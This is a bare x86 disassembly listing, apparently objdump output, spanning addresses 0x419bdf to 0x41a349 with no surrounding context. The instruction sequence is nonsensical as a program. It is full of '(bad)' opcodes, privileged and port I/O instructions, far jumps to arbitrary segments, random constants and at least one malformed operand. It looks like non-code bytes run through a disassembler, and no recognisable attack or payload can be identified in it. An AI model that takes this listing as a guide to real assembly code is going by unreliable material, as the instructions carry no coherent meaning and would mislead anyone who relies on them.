  419bdf:	ficom  DWORD PTR [esi]
  419be1:	add    DWORD PTR [edx-0x1cdd6381],0x79
  419be8:	pop    ecx
  419be9:	jge    0x419bc8
  419beb:	scas   eax,DWORD PTR es:[edi]
  419bec:	jno    0x419b93
  419bee:	xor    BYTE PTR [ebp+0x1e],bh
  419bf1:	ret    0x3388
  419bf4:	push   ebp
  419bf5:	stc    
  419bf6:	xchg   BYTE PTR [ecx+ecx*1+0xb],bh
  419bfa:	or     al,0xac
  419bfc:	bound  eax,QWORD PTR [eax]
  419bfe:	addr16 (bad) 
  419c00:	pop    esp
  419c01:	or     ecx,DWORD PTR [esi-0x40a831]
  419c07:	sbb    BYTE PTR [esi+0x58],cl
  419c0a:	push   edx
  419c0b:	bound  edi,QWORD PTR [esi-0x521314e6]
  419c11:	das    
  419c12:	test   eax,0x99a56bd2
  419c17:	mov    gs,edi
  419c19:	imul   ebx,DWORD PTR [esi+0x19],0x5e
  419c1d:	push   esp
  419c1e:	mov    bl,cl
  419c20:	cld    
  419c21:	repnz push es
  419c23:	imul   ecx,DWORD PTR [edx],0x4ecee545
  419c29:	lds    ebp,FWORD PTR [eax+0xc53a19d]
  419c2f:	imul   eax,DWORD PTR [edx],0x3
  419c32:	push   0x283fc912
  419c37:	mov    al,0xca
  419c39:	push   eax
  419c3a:	add    eax,0x16ce86d0
  419c3f:	hlt    
  419c40:	push   cs
  419c41:	jmp    0xbd49:0x6951aa06
  419c48:	aam    0x31
  419c4a:	call   0x5a434524
  419c4f:	std    
  419c50:	sub    ebx,DWORD PTR [edx+0x251453e6]
  419c56:	and    BYTE PTR [esi],ah
  419c58:	bound  edx,QWORD PTR [eax-0x1a739650]
  419c5e:	rol    DWORD PTR [eax-0x6e4c7b7],1
  419c64:	xchg   ebp,eax
  419c65:	(bad)  
  419c68:	leave  
  419c69:	fild   WORD PTR ds:0xc6d82022
  419c6f:	in     al,dx
  419c70:	sub    BYTE PTR [esi-0x1509c46a],dl
  419c76:	je     0x419c02
  419c78:	int    0x37
  419c7a:	add    esp,edx
  419c7c:	jle    0x419c42
  419c7e:	idiv   BYTE PTR [ebp-0x52]
  419c81:	fimul  DWORD PTR [ebx]
  419c83:	push   cs
  419c84:	mov    dl,BYTE PTR [edi+0x16726656]
  419c8a:	sub    al,0xf8
  419c8c:	pop    edi
  419c8d:	mov    edx,0x4b5e024d
  419c92:	ins    DWORD PTR es:[edi],dx
  419c93:	call   0xf82f3937
  419c98:	pop    esi
  419c99:	mov    ebx,0x9c0cb268
  419c9e:	cmp    BYTE PTR [esi],0x5f
  419ca1:	cli    
  419ca2:	std    
  419ca3:	(bad)
  419ca6:	xchg   ebp,eax
  419ca7:	sub    eax,0x7a46cb4f
  419cac:	jmp    DWORD PTR [eax-0x13343f64]
  419cb2:	dec    edx
  419cb3:	mov    cl,0x58
  419cb5:	dec    ebp
  419cb6:	cmp    ebx,edi
  419cb8:	(bad)  
  419cba:	arpl   WORD PTR [edi],sp
  419cbc:	ss adc eax,0xd4542ee7
  419cc2:	push   0xffffffd0
  419cc4:	mov    esp,0x930581e8
  419cc9:	or     eax,0x31f4f997
  419cce:	out    0xac,al
  419cd0:	jno    0x419c8f
  419cd2:	sub    DWORD PTR [edx-0x40],ebp
  419cd5:	add    eax,0xfe8e9b62
  419cda:	cs xchg esi,eax
  419cdc:	imul   eax,ebp,0x5811cec1
  419ce2:	mov    edi,DWORD PTR [edi-0x64]
  419ce5:	jns    0x419cc3
  419ce7:	fs mov bh,dh
  419cea:	les    ecx,FWORD PTR [edi-0x27]
  419ced:	nop
  419cee:	ror    DWORD PTR [esi+0x39d46696],0xd4
  419cf5:	xlat   BYTE PTR ds:[ebx]
  419cf6:	inc    esp
  419cf7:	jne    0x419cb5
  419cf9:	xor    BYTE PTR [ebx+0x5fa9081d],cl
  419cff:	test   eax,0x765dc7e2
  419d04:	lahf   
  419d05:	daa    
  419d06:	push   esi
  419d07:	jne    0x419cd7
  419d09:	xchg   al,dh
  419d0b:	mov    bh,0x47
  419d0d:	add    BYTE PTR [edx+0x7740835c],ah
  419d13:	ret    0x6ebd
  419d16:	xchg   ecx,eax
  419d17:	pop    eax
  419d18:	push   0x7b
  419d1a:	xor    DWORD PTR [edi-0x5c],eax
  419d1d:	adc    eax,0x1f435b3a
  419d22:	xor    DWORD PTR [eax],ecx
  419d24:	dec    ecx
  419d25:	loope  0x419d9e
  419d27:	push   ds
  419d28:	and    bh,BYTE PTR [esi]
  419d2a:	sub    al,0xd3
  419d2c:	ins    DWORD PTR es:[edi],dx
  419d2d:	bound  edi,QWORD PTR [esi-0x5b]
  419d30:	sbb    al,dl
  419d32:	icebp  
  419d33:	cmp    BYTE PTR [ebx],ah
  419d35:	das    
  419d36:	lds    edi,FWORD PTR [ebx]
  419d38:	mov    edi,0x32b7512e
  419d3d:	pop    bx
  419d3f:	inc    esi
  419d40:	test   BYTE PTR [ebx-0x24],0x18
  419d44:	inc    edx
  419d45:	xchg   ecx,eax
  419d46:	mov    al,0xbb
  419d48:	jp     0x419d41
  419d4a:	and    DWORD PTR [esi],ebp
  419d4c:	sbb    DWORD PTR [eax],0x8772e00a
  419d52:	pushf  
  419d53:	dec    ebp
  419d54:	push   esp
  419d55:	xor    DWORD PTR [ecx],edi
  419d57:	mov    esp,DWORD PTR [edi]
  419d59:	and    al,0xc0
  419d5b:	push   0x67dc6a69
  419d60:	sub    ebp,DWORD PTR [eax+ebx*2+0x7a]
  419d64:	xor    DWORD PTR [ecx],ecx
  419d66:	div    ch
  419d68:	and    al,0xe9
  419d6a:	into   
  419d6b:	call   DWORD PTR [esi+edx*8]
  419d6e:	adc    eax,0x95c4a045
  419d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d74:	lock (bad) 
  419d76:	ficomp WORD PTR [edx+ebx*4-0x27f6a2a4]
  419d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d7e:	mov    eax,0x85981e1b
  419d83:	xor    eax,DWORD PTR [ebx+0x29c8d1fe]
  419d89:	jge    0x419d98
  419d8b:	addr16 and ax,0xa7c8
  419d90:	js     0x419ddb
  419d92:	test   DWORD PTR [eax-0x2],ebp
  419d95:	inc    ecx
  419d96:	nop
  419d97:	in     al,dx
  419d98:	clc    
  419d99:	dec    esp
  419d9a:	inc    esp
  419d9b:	out    0xd0,eax
  419d9d:	inc    edx
  419d9e:	data16 sahf 
  419da0:	in     al,0x28
  419da2:	lds    ecx,FWORD PTR es:[esi]
  419da5:	dec    esp
  419da6:	xchg   BYTE PTR [eax-0x2],bh
  419da9:	lea    ebx,[ebx-0xcbe8ed5]
  419daf:	adc    al,BYTE PTR [edx-0x7b]
  419db2:	sub    edx,ecx
  419db4:	xor    BYTE PTR [ebx+0x6bb98836],dh
  419dba:	add    al,BYTE PTR [ebp-0x3a]
  419dbd:	mov    eax,ds:0x98095511
  419dc2:	push   ebx
  419dc3:	adc    DWORD PTR [ecx],esi
  419dc5:	scas   eax,DWORD PTR es:[edi]
  419dc6:	xor    al,0xcd
  419dc8:	and    dh,BYTE PTR [ecx]
  419dca:	nop
  419dcb:	pop    esi
  419dcc:	fwait
  419dcd:	pop    ds
  419dce:	loop   0x419d55
  419dd0:	dec    ebx
  419dd1:	adc    DWORD PTR [esi+0x41beb1b9],0xffffffdf
  419dd8:	lock add DWORD PTR [ebx+0x37],esi
  419ddc:	mov    ah,0x95
  419dde:	xchg   ebx,eax
  419ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419de0:	retf   0xd0e4
  419de3:	mov    eax,ds:0x146657da
  419de8:	jbe    0x419e32
  419dea:	(bad)  
  419deb:	mov    dl,0x81
  419ded:	sbb    eax,DWORD PTR [ecx+0x11d85e64]
  419df3:	sti    
  419df4:	push   ds
  419df5:	mov    ds:0x7ccc4606,al
  419dfa:	fucomi st,st(5)
  419dfc:	push   esi
  419dfd:	inc    ebp
  419dfe:	xor    BYTE PTR ds:0x70647ee8,dl
  419e04:	jmp    0xa023:0xca445f2a
  419e0b:	cmp    al,0x3f
  419e0d:	mov    al,ds:0x607f68a0
  419e12:	dec    edx
  419e13:	out    0x38,eax
  419e15:	sar    DWORD PTR [esi],cl
  419e17:	mov    ?,WORD PTR [edx]
  419e19:	fdivr  QWORD PTR [esi+0xdcdfaa0]
  419e1f:	das    
  419e20:	imul   DWORD PTR [ebp-0x21596df8]
  419e26:	mov    cl,0x6e
  419e28:	xor    eax,DWORD PTR ds:0xb834a8e7
  419e2e:	inc    ebp
  419e2f:	pop    DWORD PTR [edx-0x54]
  419e32:	jae    0x419dd3
  419e34:	gs xor ecx,ebx
  419e37:	mov    esi,0x79af5ebd
  419e3c:	mov    edi,0x3191c636
  419e41:	daa    
  419e42:	inc    ecx
  419e43:	or     dl,BYTE PTR [eax+0x1bb6e7ae]
  419e49:	add    al,0x14
  419e4b:	dec    edx
  419e4c:	cwde   
  419e4d:	icebp  
  419e4e:	popa   
  419e4f:	inc    edi
  419e50:	popa   
  419e51:	(bad)  
  419e52:	push   edi
  419e53:	lock out dx,eax
  419e55:	fimul  WORD PTR [ebp-0x38]
  419e58:	rol    bl,1
  419e5a:	sbb    al,0xa9
  419e5c:	push   ecx
  419e5d:	push   ds
  419e5e:	push   ebx
  419e5f:	out    0x24,al
  419e61:	push   ds
  419e62:	loopne 0x419e68
  419e64:	stc    
  419e65:	mov    eax,ds:0x9f346076
  419e6a:	pusha  
  419e6b:	shr    ah,0x4c
  419e6e:	mov    es,WORD PTR [eax-0x357c175f]
  419e74:	(bad)  
  419e75:	popa   
  419e76:	and    BYTE PTR [eax],al
  419e78:	add    al,dl
  419e7a:	jnp    0x419e5b
  419e7c:	arpl   sp,ax
  419e7e:	into   
  419e7f:	lock mov dh,0xf6
  419e82:	outs   dx,BYTE PTR ds:[esi]
  419e83:	fnstcw WORD PTR [edi]
  419e85:	and    al,0xac
  419e87:	call   0xc6edb207
  419e8c:	mov    cl,0x2
  419e8e:	dec    edi
  419e8f:	jo     0x419ede
  419e91:	and    BYTE PTR [edi-0x5b],ch
  419e94:	inc    edi
  419e95:	test   al,0xbf
  419e97:	out    dx,eax
  419e98:	fidivr WORD PTR [ecx]
  419e9a:	sbb    ch,BYTE PTR [esi+0x32407e07]
  419ea0:	jg     0x419ec3
  419ea2:	inc    edi
  419ea3:	inc    esi
  419ea4:	xor    ebp,ebp
  419ea6:	xlat   BYTE PTR ds:[ebx]
  419ea7:	adc    ebx,DWORD PTR [ebp-0xc]
  419eaa:	xor    edx,edx
  419eac:	test   DWORD PTR [edi-0x4cbc7687],edx
  419eb2:	or     bh,BYTE PTR [eax-0x1b]
  419eb5:	sub    bh,BYTE PTR [ebx]
  419eb7:	jge    0x419e62
  419eb9:	push   esp
  419eba:	adc    bl,0xbc
  419ebd:	enter  0x4322,0xec
  419ec1:	mov    eax,0x322e6f85
  419ec6:	pop    edx
  419ec7:	test   eax,0xa716fa0e
  419ecc:	cmp    DWORD PTR [esi-0x4f],eax
  419ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed0:	jp     0x419ed0
  419ed2:	sbb    cl,BYTE PTR [esi]
  419ed4:	mov    ebx,0xa9a7717c
  419ed9:	mov    dh,0x31
  419edb:	xor    BYTE PTR [esi+0x4f],ch
  419ede:	mov    bl,0xe6
  419ee0:	push   cs
  419ee1:	ds out dx,al
  419ee3:	gs add al,0x59
  419ee6:	or     al,0xb3
  419ee8:	push   ds
  419ee9:	in     eax,0x33
  419eeb:	sub    bh,BYTE PTR [ebx+0x5fe9e7fb]
  419ef1:	sar    DWORD PTR [edi+0x36686f1b],0xf6
  419ef8:	mov    BYTE PTR [ebx],bl
  419efa:	push   ebp
  419efb:	arpl   WORD PTR [ebx-0x5b],dx
  419efe:	pusha  
  419eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f00:	icebp  
  419f01:	std    
  419f02:	mov    dh,0x61
  419f04:	push   edx
  419f05:	pushf  
  419f06:	or     cl,dl
  419f08:	push   ss
  419f09:	je     0x419f44
  419f0b:	or     al,bh
  419f0d:	sub    BYTE PTR [ecx+0x20dcf50b],ch
  419f13:	out    dx,eax
  419f14:	stos   DWORD PTR es:[edi],eax
  419f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f16:	rcl    BYTE PTR [ecx],cl
  419f18:	dec    esi
  419f19:	ret    0x57e3
  419f1c:	arpl   dx,dx
  419f1e:	cld    
  419f1f:	jl     0x419f28
  419f21:	and    ebp,DWORD PTR [ebx+0x5c]
  419f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f25:	lds    eax,FWORD PTR [eax-0x4a]
  419f28:	xchg   esi,eax
  419f29:	mov    dh,BYTE PTR [ebx+esi*2-0xf]
  419f2d:	es jb  0x419f30
  419f30:	in     al,0x4a
  419f32:	imul   ebp,edi,0xffffffe4
  419f35:	adc    al,0xaa
  419f37:	inc    edi
  419f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f39:	scas   al,BYTE PTR es:[edi]
  419f3a:	idiv   edi
  419f3c:	ret    
  419f3d:	and    BYTE PTR [edx+0x23],ch
  419f40:	(bad)  
  419f41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f42:	in     eax,dx
  419f43:	or     ebp,esi
  419f45:	mov    ecx,0xa429ffbe
  419f4a:	inc    edx
  419f4b:	or     al,0xec
  419f4d:	mov    edi,0x12e1af6c
  419f52:	test   eax,0xf451b2ba
  419f57:	adc    al,0xbb
  419f59:	fist   DWORD PTR [ebx-0x596d8685]
  419f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f60:	mov    ah,0xa7
  419f62:	ja     0x419f12
  419f64:	jno    0x419f67
  419f66:	push   ecx
  419f67:	push   edi
  419f68:	aad    0x50
  419f6a:	fmul   st,st(5)
  419f6c:	sbb    BYTE PTR [eax],0xf0
  419f6f:	mov    edx,DWORD PTR [eax-0x55]
  419f72:	inc    ebx
  419f73:	add    BYTE PTR [eax],cl
  419f75:	push   DWORD PTR [edx+0x32]
  419f78:	mul    DWORD PTR [ebx+0x31]
  419f7b:	xor    al,0xdd
  419f7d:	loopne 0x419fb9
  419f7f:	mov    edi,DWORD PTR [edx-0x4d]
  419f82:	cmp    bh,bl
  419f84:	inc    eax
  419f85:	mov    dh,0x57
  419f87:	test   ecx,edx
  419f89:	xchg   ebx,eax
  419f8a:	mov    ebp,0x176f96f4
  419f8f:	cwde   
  419f90:	ja     0x419f8f
  419f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f93:	ret    
  419f94:	or     al,0xb1
  419f96:	mov    dh,BYTE PTR [eax]
  419f98:	cmp    DWORD PTR [esi+0x6],ebp
  419f9b:	push   ss
  419f9c:	mov    DWORD PTR [eax+0x3f],ebx
  419f9f:	addr16 cwde 
  419fa1:	jae    0x419ffc
  419fa3:	cdq    
  419fa4:	push   ss
  419fa5:	and    ch,ch
  419fa7:	pop    es
  419fa8:	inc    esp
  419fa9:	das    
  419faa:	xchg   ebp,eax
  419fab:	xchg   ebx,eax
  419fac:	jge    0x419fb7
  419fae:	push   cs
  419faf:	adc    al,0x95
  419fb1:	in     eax,dx
  419fb2:	loopne 0x419fd4
  419fb4:	pop    ebp
  419fb5:	mov    edx,0x213dbd07
  419fba:	jno    0x419fb5
  419fbc:	gs dec edi
  419fbe:	jge    0x419f5a
  419fc0:	ret    0x1646
  419fc3:	mov    al,0x17
  419fc5:	imul   ebp,DWORD PTR [ebx*4+0x1c67df10],0x91ca82ba
  419fd0:	dec    edi
  419fd1:	andps  xmm7,XMMWORD PTR [edx]
  419fd4:	(bad)  
  419fd5:	call   0xd1810851
  419fda:	xchg   edx,eax
  419fdb:	out    0x55,al
  419fdd:	stos   BYTE PTR es:[edi],al
  419fde:	and    ecx,DWORD PTR [esi+0x4af4f426]
  419fe4:	sub    al,0x3
  419fe6:	push   ss
  419fe7:	imul   ebp,DWORD PTR [ebp-0x79a6cda5],0x6b5f989d
  419ff1:	dec    BYTE PTR ds:0x86046dca
  419ff7:	dec    ecx
  419ff8:	jmp    FWORD PTR [ebx+edx*8-0x5212cce4]
  419fff:	xor    edx,edi
  41a001:	fiadd  DWORD PTR [ebx+0x71]
  41a004:	ja     0x41a07f
  41a006:	shl    BYTE PTR cs:[ebp+0x29],1
  41a00a:	sub    al,0x8f
  41a00c:	xchg   esp,eax
  41a00d:	sub    cl,cl
  41a00f:	(bad)  [ebx+0x6e]
  41a012:	fsubr  st,st(3)
  41a014:	cmp    ebx,DWORD PTR [eax]
  41a016:	sar    BYTE PTR [ecx+ebx*2],1
  41a019:	xor    al,0xb4
  41a01b:	lock dec esp
  41a01d:	vmaxss xmm1,xmm1,xmm1
  41a021:	push   0x77
  41a023:	inc    ebp
  41a024:	rcl    DWORD PTR [ecx+0x41],cl
  41a027:	xor    ebx,DWORD PTR [ecx+edi*1+0x5f]
  41a02b:	jae    0x41a04e
  41a02d:	dec    edx
  41a02e:	pop    es
  41a02f:	ret    
  41a030:	mov    edx,DWORD PTR [esi]
  41a032:	jge    0x41a0aa
  41a034:	jbe    0x41a004
  41a036:	mov    esi,0xee702bf9
  41a03b:	inc    ebp
  41a03c:	sbb    DWORD PTR [ebx+0x50],eax
  41a03f:	dec    ebx
  41a040:	stc    
  41a041:	xor    BYTE PTR ds:0x76290b1e,cl
  41a047:	mov    ebp,0x4d78f0c0
  41a04c:	in     al,dx
  41a04d:	mov    ebp,0x347d2fab
  41a052:	rol    DWORD PTR [ebx+0x1e],cl
  41a055:	(bad)  
  41a056:	stos   BYTE PTR es:[edi],al
  41a057:	adc    al,0xeb
  41a059:	cmc    
  41a05a:	inc    edx
  41a05b:	and    DWORD PTR [ebp+0x36],edi
  41a05e:	hlt    
  41a05f:	xchg   DWORD PTR [edi],edx
  41a061:	push   edx
  41a062:	push   eax
  41a063:	sub    al,0xd4
  41a065:	push   eax
  41a066:	test   al,0x37
  41a068:	setg   BYTE PTR [eax+0x4e6d824a]
  41a06f:	jbe    0x41a050
  41a071:	ret    0xd898
  41a074:	fs and eax,0xf7960eaa
  41a07a:	fisubr DWORD PTR [esi+eax*8+0x40]
  41a07e:	scas   al,BYTE PTR es:[edi]
  41a07f:	shr    DWORD PTR [edx-0x3bfbe1ee],1
  41a085:	xchg   BYTE PTR [edx],dl
  41a087:	dec    edi
  41a088:	inc    ecx
  41a089:	sbb    al,0xe7
  41a08b:	aas    
  41a08c:	mov    esp,0xd12a9d4a
  41a091:	push   ecx
  41a092:	outs   dx,BYTE PTR ds:[esi]
  41a093:	xchg   edx,eax
  41a094:	jge    0x41a104
  41a096:	mov    ebx,0xed2b0d06
  41a09b:	push   eax
  41a09c:	dec    ecx
  41a09d:	imul   edx,DWORD PTR [eax-0x372c41f9],0x33
  41a0a4:	test   al,0x8a
  41a0a6:	pop    ebp
  41a0a7:	xchg   ecx,eax
  41a0a8:	repz mov ds:0x1f18e9d1,eax
  41a0ae:	js     0x41a115
  41a0b0:	push   0xb04b1009
  41a0b5:	out    dx,al
  41a0b6:	jmp    0x41a10e
  41a0b8:	and    BYTE PTR [edi],bh
  41a0ba:	ret    0xb5e
  41a0bd:	les    esi,FWORD PTR [eax+esi*4+0x329b0f10]
  41a0c4:	mov    esp,0xa08addc5
  41a0c9:	cmp    eax,0x7a5832de
  41a0ce:	mov    WORD PTR [ebx-0x58],es
  41a0d1:	dec    eax
  41a0d2:	mov    ebx,0x3b942bbd
  41a0d7:	xchg   esp,eax
  41a0d8:	addr16 mov eax,0xc9cb0935
  41a0de:	scas   al,BYTE PTR es:[edi]
  41a0df:	in     al,dx
  41a0e0:	mov    dl,0x10
  41a0e2:	lods   al,BYTE PTR ds:[esi]
  41a0e3:	stc    
  41a0e4:	mov    ebp,DWORD PTR [edx+0x60]
  41a0e7:	out    dx,eax
  41a0e8:	cwde   
  41a0e9:	shr    BYTE PTR [ebx],0x70
  41a0ec:	ret    
  41a0ed:	pop    DWORD PTR [ecx-0xc]
  41a0f0:	daa    
  41a0f1:	cwde   
  41a0f2:	push   ebp
  41a0f3:	inc    ecx
  41a0f4:	popf   
  41a0f5:	call   DWORD PTR [ecx-0x41]
  41a0f8:	fcomp  st(6)
  41a0fa:	sbb    edx,esp
  41a0fc:	(bad)  
  41a0fd:	jle    0x41a11c
  41a0ff:	mov    al,0xc9
  41a101:	mov    eax,DWORD PTR [ebx+esi*2+0x6b]
  41a105:	adc    eax,0xb9e124f7
  41a10a:	(bad)  
  41a10b:	(bad)  
  41a10c:	push   ecx
  41a10d:	push   ebp
  41a10e:	inc    edx
  41a10f:	jo     0x41a147
  41a111:	lahf   
  41a112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a113:	popa   
  41a114:	mov    BYTE PTR [edi-0x56],al
  41a117:	pop    ss
  41a118:	push   DWORD PTR [ebp-0x2]
  41a11b:	or     al,0xac
  41a11d:	cli    
  41a11e:	push   0x2dffb5d4
  41a123:	jo     0x41a121
  41a125:	data16 loope 0x41a15d
  41a128:	xchg   esp,eax
  41a129:	fistp  WORD PTR [ecx+0xbbbfc8a]
  41a12f:	js     0x41a117
  41a131:	das    
  41a132:	popf   
  41a133:	and    DWORD PTR [eax+eax*8+0x220ff424],eax
  41a13a:	jns    0x41a14c
  41a13c:	leave  
  41a13d:	sti    
  41a13e:	call   0xfced:0xb5ef3302
  41a145:	(bad)  
  41a146:	jo     0x41a168
  41a148:	cld    
  41a149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a14a:	pop    es
  41a14b:	pop    esp
  41a14c:	mov    eax,DWORD PTR [ebp-0xc]
  41a14f:	dec    esi
  41a150:	js     0x41a163
  41a152:	or     al,0xe
  41a154:	in     al,dx
  41a155:	addr16 inc ebp
  41a157:	or     al,BYTE PTR [esi+0x2e0230d6]
  41a15d:	in     al,0x41
  41a15f:	xchg   edi,eax
  41a160:	push   eax
  41a161:	aad    0xe4
  41a163:	call   FWORD PTR [esi+0x53]
  41a166:	or     eax,0x3cbfb9c4
  41a16b:	mov    al,0xfe
  41a16d:	or     eax,0xf0a83174
  41a172:	mov    BYTE PTR [edx],bl
  41a174:	pop    ecx
  41a175:	inc    edx
  41a176:	hlt    
  41a177:	jp     0x41a1c0
  41a179:	call   0xeb6a:0xd03ccc6a
  41a180:	das    
  41a181:	shr    DWORD PTR [edx-0x3c],cl
  41a184:	fwait
  41a185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a186:	(bad)  
  41a187:	cmp    bl,BYTE PTR [ebx+0x65]
  41a18a:	inc    esp
  41a18b:	repz adc edi,DWORD PTR [edx]
  41a18e:	mov    eax,0x52b25c6a
  41a193:	icebp  
  41a194:	(bad)  
  41a195:	cmp    ch,dl
  41a197:	and    ch,BYTE PTR [ebx+0x6b338907]
  41a19d:	stc    
  41a19e:	xchg   esp,eax
  41a19f:	movntq QWORD PTR [ecx+esi*1-0x1c],mm0
  41a1a4:	xchg   ebp,eax
  41a1a5:	pop    ss
  41a1a6:	fld    DWORD PTR [ebx-0xfd904a4]
  41a1ac:	inc    edx
  41a1ad:	push   ds
  41a1ae:	inc    esi
  41a1af:	mov    eax,ds:0x7c990dc7
  41a1b4:	not    ecx
  41a1b6:	xor    ebx,DWORD PTR [ebx]
  41a1b8:	dec    esp
  41a1b9:	aad    0x2b
  41a1bb:	iret   
  41a1bc:	cwde   
  41a1bd:	cli    
  41a1be:	into   
  41a1bf:	cmp    edi,DWORD PTR [ecx-0x756321e2]
  41a1c5:	scas   al,BYTE PTR es:[edi]
  41a1c6:	rol    BYTE PTR [edi-0x16],0x56
  41a1ca:	or     eax,DWORD PTR [edx+0x3d]
  41a1cd:	call   0xc338:0x994debbd
  41a1d4:	ins    DWORD PTR es:[edi],dx
  41a1d5:	jo     0x41a1b0
  41a1d7:	pop    DWORD PTR [edi+0x4de51544]
  41a1dd:	jmp    0x41c6:0xe3f33710
  41a1e4:	mov    DWORD PTR [edi+0x17],0xeac4585e
  41a1eb:	xor    cl,bh
  41a1ed:	or     al,0x3a
  41a1ef:	or     ebx,DWORD PTR [eax+0x70]
  41a1f2:	inc    edx
  41a1f3:	mov    esi,0x79bac1a5
  41a1f8:	jmp    FWORD PTR [edi+0x56]
  41a1fb:	arpl   WORD PTR [ecx],si
  41a1fd:	xor    al,0xdf
  41a1ff:	sbb    eax,0xea93fd61
  41a204:	and    bh,BYTE PTR [esi]
  41a206:	call   0x42e9ee47
  41a20b:	ror    BYTE PTR [eax-0x4e],cl
  41a20e:	xchg   ebx,eax
  41a20f:	xchg   edx,eax
  41a210:	inc    ebp
  41a211:	aad    0xc4
  41a213:	pop    esi
  41a214:	mov    al,0xb8
  41a216:	or     dh,BYTE PTR [edi+edx*8]
  41a219:	mov    esi,0x182cb7e4
  41a21e:	xor    eax,0x214832c9
  41a223:	push   0xffffffc3
  41a225:	scas   al,BYTE PTR es:[edi]
  41a226:	xor    DWORD PTR [esi-0x4a],0xffffffbb
  41a22a:	pop    ds
  41a22b:	addr16 (bad) 
  41a22d:	cdq    
  41a22e:	xor    ecx,ecx
  41a230:	pop    ebx
  41a231:	ficom  WORD PTR [esi]
  41a233:	lods   al,BYTE PTR ds:[esi]
  41a234:	or     ebx,DWORD PTR [ecx]
  41a236:	nop
  41a237:	jae    0x41a1fc
  41a239:	jmp    0x7f78a06c
  41a23e:	pop    edx
  41a23f:	js     0x41a23c
  41a241:	push   es
  41a242:	cwde   
  41a243:	xor    ah,ah
  41a245:	cmp    ah,al
  41a247:	mov    ds:0xa9027076,al
  41a24d:	add    al,0xc3
  41a24f:	test   BYTE PTR [eax],bl
  41a251:	int    0xe7
  41a253:	(bad)  
  41a255:	cld    
  41a256:	cmp    eax,0xc588a67b
  41a25c:	ins    DWORD PTR es:[edi],dx
  41a25d:	ret    
  41a25e:	pushf  
  41a25f:	jg     0x41a225
  41a261:	xchg   ebx,eax
  41a262:	sub    eax,0xa53def22
  41a267:	ret    0x1907
  41a26a:	mov    bl,0xc1
  41a26c:	cli    
  41a26d:	mov    edi,0x2b852c23
  41a272:	scas   eax,DWORD PTR es:[di]
  41a274:	xor    dh,BYTE PTR [ecx+0x7ae36b3]
  41a27a:	sbb    al,0xb8
  41a27c:	test   eax,0x25fdd17f
  41a281:	hlt    
  41a282:	ins    BYTE PTR es:[edi],dx
  41a283:	cmp    eax,0xc6ba7c12
  41a289:	mov    ebx,0xc782ae59
  41a28e:	add    DWORD PTR [edx+edx*8],edx
  41a291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a292:	ds pushf 
  41a294:	and    BYTE PTR [edx-0x4b208831],dh
  41a29a:	lods   al,BYTE PTR ds:[esi]
  41a29b:	and    cl,0x29
  41a29e:	lea    ecx,[eax]
  41a2a0:	jge    0x41a25e
  41a2a2:	rcl    cl,cl
  41a2a4:	cmp    BYTE PTR [ebx-0x42],0x38
  41a2a8:	xlat   BYTE PTR ds:[ebx]
  41a2a9:	loope  0x41a235
  41a2ab:	fcmovb st,st(1)
  41a2ad:	popf   
  41a2ae:	adc    eax,0x2afa7a66
  41a2b3:	push   esp
  41a2b4:	push   ebp
  41a2b5:	dec    ebx
  41a2b6:	mov    dh,BYTE PTR [esi]
  41a2b8:	add    ah,al
  41a2ba:	sub    edi,DWORD PTR [edi+0x3b569ecb]
  41a2c0:	jecxz  0x41a2b5
  41a2c2:	(bad)  
  41a2c3:	int3   
  41a2c4:	push   edi
  41a2c5:	inc    edi
  41a2c6:	jg     0x41a2f5
  41a2c8:	jae    0x41a29c
  41a2ca:	lods   al,BYTE PTR ds:[esi]
  41a2cb:	arpl   WORD PTR [eax+0x6be0354a],bp
  41a2d1:	sahf   
  41a2d2:	cmp    DWORD PTR [eax],ebx
  41a2d4:	lock inc ecx
  41a2d6:	mov    al,ds:0xca08951d
  41a2db:	jl     0x41a27d
  41a2dd:	cmp    ecx,esi
  41a2df:	lds    edi,FWORD PTR [esi+0x7d]
  41a2e2:	scas   al,BYTE PTR es:[edi]
  41a2e3:	xchg   di,ax
  41a2e5:	or     DWORD PTR [edi+0x398ebdab],ebx
  41a2eb:	jae    0x41a2ba
  41a2ed:	mov    eax,ds:0xd83e1935
  41a2f2:	fmulp  st(0),st
  41a2f4:	ins    BYTE PTR es:[edi],dx
  41a2f5:	pop    ebx
  41a2f6:	push   ss
  41a2f7:	jmp    0x41a32f
  41a2f9:	mov    ecx,0xa21dd6fa
  41a2fe:	mov    esi,0xfaff13ac
  41a303:	and    al,0x4a
  41a305:	add    eax,0x2cccade1
  41a30a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a30b:	cld    
  41a30c:	xor    al,0xc7
  41a30e:	fimul  DWORD PTR [ebp-0x28ef706b]
  41a314:	outs   dx,BYTE PTR ds:[esi]
  41a315:	shr    BYTE PTR [ecx],0x12
  41a318:	sti    
  41a319:	clc    
  41a31a:	call   DWORD PTR [ebx]
  41a31c:	scas   al,BYTE PTR es:[edi]
  41a31d:	hlt    
  41a31e:	inc    edi
  41a31f:	lods   al,BYTE PTR ds:[esi]
  41a320:	pop    ecx
  41a321:	retf   0x53f7
  41a324:	or     al,0x2d
  41a326:	stc    
  41a327:	push   esi
  41a328:	int    0x28
  41a32a:	xchg   ebp,eax
  41a32c:	mov    ch,0x5c
  41a32e:	xchg   BYTE PTR [esi+0x4b417ee7],cl
  41a334:	sub    eax,0xdfac777a
  41a339:	imul   eax,esi,0x3b23142
  41a33f:	adc    ecx,DWORD PTR [ebx]
  41a341:	dec    ecx
  41a342:	sub    ah,dl
  41a344:	in     eax,0xd3
  41a346:	xor    DWORD PTR [eax+0x72],edi
  41a349:	or     esp,edx
